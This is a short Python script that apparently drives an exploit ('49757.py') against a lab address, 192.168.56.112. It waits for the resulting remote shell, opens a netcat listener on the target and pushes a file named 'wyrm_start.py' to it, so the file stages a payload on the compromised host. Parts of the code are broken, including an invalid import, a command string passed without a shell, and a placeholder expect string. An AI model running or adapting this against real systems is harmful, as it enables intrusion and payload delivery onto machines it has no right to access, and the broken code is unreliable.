from time import sleep
from pexpect import spawn, expect
import sys
from subprocess import call
def listener():
	call("nc -lp 9999 > test.txt")

def sender():
	call("nc 192.168.56.112 < test.txt")


listen = spawn("python3 49757.py 192.168.56.112")
listen.logfile = sys.stdout.buffer


index = listen.expect_exact(["Send `exit` to quit shell", "ConnectionRefusedError"])

if index == 0:
	listen.sendline("nc -lp 9999 > test1.txt")
	sleep(2)
	call("nc -w 5 192.168.56.112 9999 < wyrm_start.py", shell=True)


	sleep(10)
	listen.sendline("ls")
	listen.expect("asdasdsad")


else:
	print("testing")
